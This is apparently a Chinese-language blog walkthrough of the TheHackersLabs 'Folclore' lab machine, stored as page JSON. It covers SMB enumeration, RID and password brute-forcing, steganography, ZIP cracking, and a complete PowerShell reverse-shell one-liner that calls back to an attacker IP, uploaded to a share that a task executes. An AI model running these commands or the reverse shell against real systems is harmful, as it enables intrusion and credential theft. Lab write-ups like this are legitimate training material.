{"pageProps":{"postData":{"id":"TheHackersLabsFolclore","contentHtml":"<h1>Folclore</h1>\n<blockquote>\n<p><a href=\"https://labs.TheHackersLabs.com/machine/123\">https://labs.TheHackersLabs.com/machine/123</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Folclore nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:14 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00045s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00025s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.101\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>仅仅两个端口</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nmap -sT -min-rate 10000 -p- 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:15 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.101\nHost is up (0.0013s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.54 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Folclore nmap -sT -A -p 139,445 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:17 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.101\nHost is up (0.00045s latency).\n\nPORT    STATE SERVICE       VERSION\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Microsoft Windows 11\nOS CPE: cpe:/o:microsoft:windows_11\nOS details: Microsoft Windows 11\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-08-05T08:17:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -1s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.45 ms 192.168.56.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 64.03 seconds\n</code></pre>\n<h3>SMB 枚举</h3>\n<p><code>SMB</code> 匿名枚举</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u anonymous -p <span class=\"hljs-string\">''</span> --shares\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo\n</code></pre>\n<p>但是并不能下载任何东西</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u anonymous -p <span class=\"hljs-string\">''</span> -M spider_plus -o DOWNLOAD_FLAG=<span class=\"hljs-literal\">true</span>\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] EXCLUDE_FILTER: [<span class=\"hljs-string\">'print$'</span>, <span class=\"hljs-string\">'ipc$'</span>]\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]   EXCLUDE_EXTS: [<span class=\"hljs-string\">'ico'</span>, <span class=\"hljs-string\">'lnk'</span>]\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [+] Saved share-file metadata to <span class=\"hljs-string\">\"/root/.nxc/modules/nxc_spider_plus/192.168.56.101.json\"</span>.\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Shares:           9 (ADMIN$, C$, Dia de Muertos, IPC$, Libertad, Lluvia, Oro, Santuario, Viento)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Readable Shares:  1 (IPC$)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total folders found:  0\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total files found:    0\n</code></pre>\n<p>但可以注意到描述中有东西</p>\n<pre><code class=\"hljs language-bash\">ADMIN$                          Admin remota\nC$                              Recurso predeterminado\nDia de Muertos                  Al final, todos somos polvo y hueso.\nIPC$            READ            IPC remota\nLibertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nLluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nOro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSantuario                       El Refugio de Ixchel\nViento                          El viento sagrado ejecutará la tarea a su debido tiempo\n</code></pre>\n<blockquote>\n<p>ADMIN$ - 远程管理员\nC$ - 默认资源\n亡灵节 - 最终，我们都会化为尘土和白骨。\nIPC$ - 读取远程IPC\n自由 - 秘密在于那些敢于追寻的人；无所畏惧地追随你的道路。\n雨 - 请注意，在这幅图中，只有懂得聆听雷声的人才能找到道路。\n金  - 你想到达羽蛇神吗？你的道路从这里开始。\n圣所 - 伊克切尔的避难所\n风 - 神圣的风会在适当的时候完成任务。</p>\n</blockquote>\n<h3>用户枚举</h3>\n<p>用户枚举，PS：之前一直卡在上边，因为没想到要通过暴力破解，因为我觉得会有密码最大阈值（</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u guest -p <span class=\"hljs-string\">''</span> --rid-brute                      \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\guest: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         500: FOLCLORE\\Administrador (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         501: FOLCLORE\\Invitado (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         503: FOLCLORE\\DefaultAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         504: FOLCLORE\\WDAGUtilityAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         513: FOLCLORE\\Ninguno (SidTypeGroup)\nSMB         192.168.56.101  445    FOLCLORE         1001: FOLCLORE\\Quetzalcoatl (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1003: FOLCLORE\\El_charro_negro (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1004: FOLCLORE\\Ix_Chel (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1005: FOLCLORE\\Tlaloc (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1006: FOLCLORE\\La_mulata_de_Cordoba (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1007: FOLCLORE\\La_Catrina (SidTypeUser)\n</code></pre>\n<p>使用得到的用户名进行密码爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> user.txt                                                        \nAdministrador\nInvitado\nDefaultAccount\nWDAGUtilityAccount\nNinguno\nQuetzalcoatl\nEl_charro_negro\nIx_Chel\nTlaloc\nLa_mulata_de_Cordoba\nLa_Catrina\n</code></pre>\n<p>经过需求尝试后，发现 <code>grep '[+]'</code> 无法匹配出来，因为账户密码过期了.. 需要匹配 <code>grep -v 'STATUS_LOGON_FAILURE'</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u user.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success | grep -v <span class=\"hljs-string\">'STATUS_LOGON_FAILURE'</span> \nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED\n</code></pre>\n<p>为了继续操作，通过图形化界面对密码进行了修改</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image1.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u el_charro_negro -p abc1234                                                                                             \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\el_charro_negro:abc1234\n</code></pre>\n<h2>图片隐写 - 1</h2>\n<p>通过该用户枚举 <code>SMB</code>，能得到一张照片</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image2.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image3.png\" alt=\"image.png\"></p>\n<p>盲猜是图片隐写了</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore binwalk -Me --run-as=root El_Charro_Negro.jpeg                              \n\nScan Time:     2025-09-24 17:32:08\nTarget File:   /root/Desktop/TheHackersLabs/Folclore/El_Charro_Negro.jpeg\nMD5 Checksum:  97f1dd191d3d9217ee0147f15a700c4f\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was \nfound or it<span class=\"hljs-string\">'s unimplemented\n\n➜  Folclore foremost El_Charro_Negro.jpeg   \nProcessing: El_Charro_Negro.jpeg\n|*|\n\n➜  Folclore exiftool El_Charro_Negro.jpeg \nExifTool Version Number         : 13.25\nFile Name                       : El_Charro_Negro.jpeg\nDirectory                       : .\nFile Size                       : 50 kB\nFile Modification Date/Time     : 2025:09:24 17:29:12+08:00\nFile Access Date/Time           : 2025:09:24 17:30:13+08:00\nFile Inode Change Date/Time     : 2025:09:24 17:29:12+08:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Big-endian (Motorola, MM)\nY Cb Cr Positioning             : Centered\nCopyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK\nImage Width                     : 736\nImage Height                    : 981\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 736x981\nMegapixels                      : 0.722\n</span></code></pre>\n<p>得到一个提示：</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image4.png\" alt=\"image.png\"></p>\n<p>给出一个字符串 <code>4+9Ii1wK</code> ，估计是个密码</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u user.txt -p <span class=\"hljs-string\">'4+9Ii1wK'</span> --ignore-pw-decoding                                               \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Quetzalcoatl:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_Catrina:4+9Ii1wK STATUS_LOGON_FAILURE\n</code></pre>\n<p>是 <code>Ix_Chel</code> 的密码，不过也过期了… 重复上边的操作</p>\n<h2>图片隐写 - 2</h2>\n<p>然后再次枚举 SMB</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image5.png\" alt=\"image.png\"></p>\n<p>得到一个 TXT 文件，又是一个凭据 <code>677Kn$q</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> La\\ clave\\ de\\ Kukulcán.txt           \nRecuerdo cuando conocí a Kukulcán, \nla serpiente emplumada que otros llaman Quetzalcóatl; \nsu mirada guardaba el misterio del viento y la sabiduría, \ny con una sonrisa me confió que su clave más preciada tenía solo ocho caracteres, \nsencilla pero poderosa, como él mismo. Nuestros caminos se entrelazan: \nyo, guardiana de la luna y la vida; é     l, \nportador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. \nAhora, sigue adelante, porque Quetzalcóatl te espera. \nContinua buscando a Tláloc,te despejare el camino entregá     \nndote su clave: 677Kn<span class=\"hljs-variable\">$q</span>.<span class=\"hljs-string\">\"\n</span></code></pre>\n<p>密码是用户 <code>Tlaloc</code>  的</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u Tlaloc -p <span class=\"hljs-string\">'677Kn$q'</span> --ignore-pw-decoding\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:677Kn<span class=\"hljs-variable\">$q</span> STATUS_PASSWORD_EXPIRED \n</code></pre>\n<p>枚举 SMB</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image6.png\" alt=\"image.png\"></p>\n<p>照片 ++</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image7.png\" alt=\"image.png\"></p>\n<p>盲猜还是隐写，直接通过 <code>stegseek</code> 可以拿到文件</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore stegseek Tlaloc.jpg \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: <span class=\"hljs-string\">\"knight\"</span>\n[i] Original filename: <span class=\"hljs-string\">\"Las primeras señales.txt\"</span>.\n[i] Extracting to <span class=\"hljs-string\">\"Tlaloc.jpg.out\"</span>.\n</code></pre>\n<p>凭证 ++</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> Tlaloc.jpg.out \nHe conseguido estos últimos dos caracteres para la clave de Kukulcán, \nla serpiente emplumada que llaman Quetzalcóatl: \n%/. Te los entrego para que completes tu búsqueda. \nAdemás, aquí tienes otra clave, \naunque debo confesar que no recuerdo a quién pertenece exactamente: \n45yD#k7. Confí     a en tu instinto para usarla sabiamente.\n</code></pre>\n<h2>ZIP crack</h2>\n<p>是用户 <code>La_mulata_de_Cordoba</code> 的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u La_mulata_de_Cordoba -p <span class=\"hljs-string\">'45yD#k7'</span>\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED\n</code></pre>\n<p>再枚举 <code>SMB</code> ，一个 txt 一个 ZIP</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image8.png\" alt=\"image.png\"></p>\n<p>TXT 得到一个账户 <code>La_Catrina:3nM93{S#</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> Mi_amiga.txt                                                   \nMi amiga ‘La Catrina’ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. \nEscribiré la clave aquí para no olvidarla: 3nM93{S#\n</code></pre>\n<p>Zip 需要密码</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore unzip Pacto.zip \nArchive:  Pacto.zip\n   skipping: Pacto.txt               need PK compat. v5.1 (can <span class=\"hljs-keyword\">do</span> v4.6)\n</code></pre>\n<p>通过 <code>John</code> 进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore zip2john Pacto.zip > <span class=\"hljs-built_in\">hash</span>\n➜  Folclore john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nCost 1 (HMAC size) is 238 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\ncelina           (Pacto.zip/Pacto.txt)     \n1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed.\n</code></pre>\n<p><code>7z</code> 进行解压</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore 7z x Pacto.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive <span class=\"hljs-keyword\">for</span> archives:\n1 file, 432 bytes (1 KiB)\n\nExtracting archive: Pacto.zip\n--\nPath = Pacto.zip\nType = zip\nPhysical Size = 432\n\n    \nEnter password (will not be echoed):\nEverything is Ok\n\nSize:       358\nCompressed: 432\n</code></pre>\n<p>得到一个神秘字符串 <code>J9c</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> Pacto.txt \nHas surcado sendas que pocos se atreven a cruzar, \npero tu viaje no concluye todavía. Invocando mis artes prohibidas, \nlogré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: \nsólo tres caracteres fui capaz de obtener. \nAhora los deposito en tus manos, \npero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.\n</code></pre>\n<p>我们检查一下上面得到的用户能做的事情，还是一个 <code>txt</code></p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> Ultimo_mensaje.txt \nSolo puedo darte el quinto carácter de su clave: ‘U’. \nLos demás caracteres que faltan deberás encontrarlos por tu cuenta, \naunque no debe ser tan difícil; solo son números o letras. \nConfía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.\n</code></pre>\n<h2>密码爆破</h2>\n<p>集合上边的得到几个<code>txt</code>，得到密码应该是 <code>J9c?U?%/</code>，第四个字母需要我们进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-keyword\">for</span> char1 <span class=\"hljs-keyword\">in</span> {a..z} {A..Z} {0..9}; <span class=\"hljs-keyword\">do</span> <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"J9c%sU%s%%/\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$char1</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$char1</span>\"</span>; <span class=\"hljs-keyword\">done</span> > wordlist.txt \n</code></pre>\n<p>得到凭据 <code>Quetzalcoatl:J9c7U7%/</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v <span class=\"hljs-string\">'STATUS_LOGON_FAILURE'</span>\nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Ninguno:J9caUa%/ (Guest)\nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Quetzalcoatl:J9c7U7%/\n</code></pre>\n<p>SMB 枚举…</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image10.png\" alt=\"image.png\"></p>\n<h2>xxxxx</h2>\n<p>查看得到的  <code>txt</code></p>\n<pre><code class=\"hljs language-bash\">➜  Folclore <span class=\"hljs-built_in\">cat</span> /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\\ Emplumada.txt \nHas recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.\nAhora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. \nSolo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. \nQue esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# \n</code></pre>\n<p>表示我们可以上传 <code>Powershell</code> 文件一次</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image11.png\" alt=\"image.png\"></p>\n<p>将下面的代码保存为 <code>xxx.ps1</code> 然后进行上传</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$client</span> = New-Object Net.Sockets.TCPClient(<span class=\"hljs-string\">'192.168.56.5'</span>,1234);<span class=\"hljs-variable\">$stream</span> = <span class=\"hljs-variable\">$client</span>.GetStream();[byte[]]<span class=\"hljs-variable\">$bytes</span> = 0..65535|%{0};<span class=\"hljs-keyword\">while</span>((<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-variable\">$stream</span>.Read(<span class=\"hljs-variable\">$bytes</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$bytes</span>.Length)) -ne 0){;<span class=\"hljs-variable\">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class=\"hljs-variable\">$bytes</span>,0, <span class=\"hljs-variable\">$i</span>);<span class=\"hljs-variable\">$sendback</span> = (iex <span class=\"hljs-variable\">$data</span> 2>&#x26;1 | Out-String );<span class=\"hljs-variable\">$sendback2</span> = <span class=\"hljs-variable\">$sendback</span> + <span class=\"hljs-string\">'PS '</span> + (<span class=\"hljs-built_in\">pwd</span>).Path + <span class=\"hljs-string\">'> '</span>;<span class=\"hljs-variable\">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class=\"hljs-variable\">$sendback2</span>);<span class=\"hljs-variable\">$stream</span>.Write(<span class=\"hljs-variable\">$sendbyte</span>,0,<span class=\"hljs-variable\">$sendbyte</span>.Length);<span class=\"hljs-variable\">$stream</span>.Flush()};<span class=\"hljs-variable\">$client</span>.Close()\n</code></pre>\n<pre><code class=\"hljs language-bash\">smbclient //192.168.56.101/viento -U Quetzalcoatl%<span class=\"hljs-string\">'J9c7U7%/'</span>\nput shell.ps1\n</code></pre>\n<p>等待弹回来</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image12.png\" alt=\"image.png\"></p>\n<p>读取 <code>User.txt</code></p>\n<pre><code class=\"hljs language-bash\">PS C:\\Users\\Quetzalcoatl\\Desktop> <span class=\"hljs-built_in\">type</span> User.txt\n456e20656c207669656e746f2079616365206c6120766572646164\n</code></pre>\n<p>为了方便操作迁移到 <code>msf</code></p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image13.png\" alt=\"image.png\"></p>\n<p>上来后通过 winpeas 等枚举了许多，但是没找到可以利用的</p>\n<p>最后可以在 <code>Downloads\\Actualizacion</code> 中找到管理员密码</p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Quetzalcoatl\\Downloads\\Actualizacion><span class=\"hljs-built_in\">type</span> Venganza.txt\n<span class=\"hljs-built_in\">type</span> Venganza.txt\nHe conseguido la clave del administrador!!!\nLa guardare para no olvidarla: xxxxxxxx\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Folclore nxc smb 192.168.56.101 -u <span class=\"hljs-string\">'administrador'</span> -p <span class=\"hljs-string\">'xxxxxx*'</span>                        \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\administrador:xxxxxx (Pwn3d!)\n</code></pre>\n<p>拿 <code>root.txt</code> ，直接读就算了，懒得拿 <code>shell</code> 了</p>\n<p><img src=\"/post-images/TheHackersLabsFolclore/image14.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>体验不算好</p>","title":"TheHackersLabs - Folclore","date":"2025-09-24","updated":"2025-09-24","tags":["TheHackersLabs","Windows","MISC"],"categories":"靶机","comments":true,"description":"Folclore https://labs.TheHackersLabs.com/machine/123 Recon PortScan 仅仅两个端口 SMB 枚举 SMB 匿名枚举 但是并不能下载任何东西 但可以注意到描述中有东西 ADMIN$ 远程管理员 C$ 默认资源 亡灵节 最终，我们都会化为..."},"recentPosts":[{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - 